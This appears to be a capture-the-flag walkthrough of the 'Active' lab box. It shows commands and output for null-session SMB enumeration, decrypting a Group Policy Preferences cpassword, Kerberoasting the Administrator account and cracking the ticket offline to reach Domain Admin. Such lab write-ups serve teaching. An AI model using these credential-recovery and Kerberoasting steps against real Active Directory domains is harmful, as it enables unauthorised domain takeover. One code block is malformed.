Active is an easy Windows box built around Active Directory. The `Replication` share is readable over a null SMB session and inside it there is a Group Policy Preferences `Groups.xml` holding an encrypted `cpassword`. Microsoft unintentionally published the AES key in 2014, so it decrypts straight to the password for `svc_tgs`, a domain service account which lets me read the user flag. For root I Kerberoast: the built-in `Administrator` account has an SPN registered on it, so as any domain user I can ask the KDC for its service ticket, which comes back encrypted with Administrator's password hash. That cracks offline to the Domain Admin password and I read `root.txt` from the `C$` share.

## Recon

### nmap

Full TCP scan:

```
chickenprophecy@pwn$ nmap -p- -sC -sV --open -oA active -v --stats-every=5s 10.129.66.150
```

![nmap TCP]({{ '/assets/img/active/02-nmap-tcp.png' | relative_url }})

The host is a Domain Controller, Windows Server 2008 R2, domain `active.htb`, with the full AD port set: DNS (53), Kerberos (88), LDAP (389/3268), and SMB (139/445). The host-script results also note SMB message signing is **required**, which rules out SMB relay later.

A UDP scan shows SNMP, Kerberos and NTP, though nothing here ends up being the way in:

```
chickenprophecy@pwn$ sudo nmap -sU -F 10.129.66.150
```

![nmap UDP]({{ '/assets/img/active/03-nmap-udp.png' | relative_url }})

```
chickenprophecy@pwn$ smbclient -N -L \\10.129.66.150

	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share

The null session works. Trying to actually connect, the default logon shares deny me, but `Replication` lets me straight in anonymously:

![Replication anonymous]({{ '/assets/img/active/05-smb-replication.png' | relative_url }})

chickenprophecy@pwn$ nxc smb 10.129.66.150 -u '' -p '' -M spider_plus
chickenprophecy@pwn$ python3 -m json.tool /home/chickenprophecy/.nxc/modules/nxc_spider_plus/10.129.66.150.json
```

## Groups.xml → svc_tgs

Ignoring the standard GPO plumbing (`GPT.INI`, `GptTmpl.inf`, `Registry.pol`), one file in the JSON stands out — a `Groups.xml` under the Preferences folder:

```
Replication/active.htb/Policies/{31B2F340-...}/MACHINE/Preferences/Groups/Groups.xml
```

![Groups.xml in spider JSON]({{ '/assets/img/active/07-json-groupsxml.png' | relative_url }})

I pull it from the share and read it. `Groups.xml` is a Group Policy Preferences file that holds a user with a password:

![Groups.xml cpassword]({{ '/assets/img/active/08-groups-xml.png' | relative_url }})

```
name="active.htb\SVC_TGS"
cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
```

That `cpassword` looks encrypted, but Microsoft published the key in 2014 (patch MS14-025). So it reverses as follows:

```
chickenprophecy@pwn$ gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
GPPstillStandingStrong2k18
```

Credentials: `svc_tgs : GPPstillStandingStrong2k18`.

## SMB as svc_tgs → user flag

I validate the creds with netexec and re-spider with the new creds. Shares that were blank anonymously now read to this domain user, including `Users`:

```
chickenprophecy@pwn$ nxc smb 10.129.66.150 -u SVC_TGS -p 'GPPstillStandingStrong2k18' -M spider_plus
```

![authenticated spider_plus]({{ '/assets/img/active/09-spider-authed.png' | relative_url }})

The user flag is sitting in svc_tgs's own profile:

![user.txt in spider JSON]({{ '/assets/img/active/10-json-usertxt.png' | relative_url }})

```
Users/SVC_TGS/Desktop/user.txt
```

I grab it from the share:

```
chickenprophecy@pwn$ smbclient //10.129.66.150/Users -U 'active.htb\SVC_TGS%GPPstillStandingStrong2k18' -c 'get "SVC_TGS/Desktop/user.txt" /tmp/user.txt'
chickenprophecy@pwn$ cat /tmp/user.txt
[user flag]
```

## Kerberoasting → Administrator

`svc_tgs` is a service account, which is exactly what Kerberoasting targets, so I ask the DC which accounts have an SPN:

```
chickenprophecy@pwn$ impacket-GetUserSPNs 'active.htb/SVC_TGS:GPPstillStandingStrong2k18' -dc-ip 10.129.66.150

ServicePrincipalName  Name           MemberOf
--------------------  -------------  --------------------------------------------------------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb
```

One result — and it's the built-in `Administrator`.

**Why Kerberoasting works here:** any authenticated domain user is allowed to request a service ticket (TGS) for any account that has an SPN, and the KDC encrypts that ticket with the target account's password hash. Two things make it possible on this box. I have valid domain creds (`svc_tgs`), and the SPN sits on `Administrator`, a Domain Admin with a weak password. So I can pull Administrator's ticket as a plain user, with no admin rights, and crack it offline.

I request the ticket and save it:

```
chickenprophecy@pwn$ impacket-GetUserSPNs 'active.htb/SVC_TGS:GPPstillStandingStrong2k18' -dc-ip 10.129.66.150 -request -outputfile kerb.hash
```

Then crack it offline with hashcat, mode `13100`:

```
chickenprophecy@pwn$ hashcat -m 13100 kerb.hash ~/rockyou.txt
...
$krb5tgs$23$*Administrator$ACTIVE.HTB$...:Ticketmaster1968
```

Domain Admin: `Administrator : Ticketmaster1968`.

## root

With Domain Admin creds, everything is readable and `root.txt` is on the Administrator's Desktop:

```
chickenprophecy@pwn$ smbclient //10.129.66.150/C$ -U 'active.htb\Administrator%Ticketmaster1968'
smb: \> cd Users\Administrator\Desktop
smb: \Users\Administrator\Desktop\> more root.txt
[root flag]
```

And that's root. :)
